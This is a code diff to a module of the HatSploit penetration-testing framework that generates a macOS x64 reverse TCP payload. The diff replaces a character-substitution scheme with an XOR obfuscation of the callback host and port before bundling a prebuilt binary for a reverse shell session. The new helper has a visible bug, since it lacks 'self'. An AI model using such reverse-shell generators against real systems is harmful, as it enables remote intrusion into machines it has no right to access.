@@ -67,23 +67,21 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
         }
     }
 
+    def crypto(string):
+        result = ""
+        for c in string:
+            magic = chr(ord(c) ^ 5)
+            result += magic
+        return result
+
     def run(self):
         local_host, local_port = self.parse_options(self.options)
+
+        local_host = crypto(local_host)
+        local_port = crypto(local_port)
 
         self.output_process("Generating payload...")
         with open('data/payloads/macos/x64/membrane_reverse_tcp/membrane.bin', 'rb') as f:
             payload = f.read()
-
-        nums_map = {
-            '0': 'v', '1': 'k', '2': 's', '3': 'h',
-            '4': 'g', '5': 'f', '6': 'c', '7': 'z',
-            '8': 'o', '9': 'x', ':': 'd', '.': 'j'
-        }
-
-        for i in local_host:
-            local_host.replace(i, nums_map[i] if i in nums_map.keys() else 'v')
-
-        for i in local_port:
-            local_port.replace(i, nums_map[i] if i in nums_map.keys() else 'v')
 
         return payload, f"{local_host} {local_port}", HatSploitSession
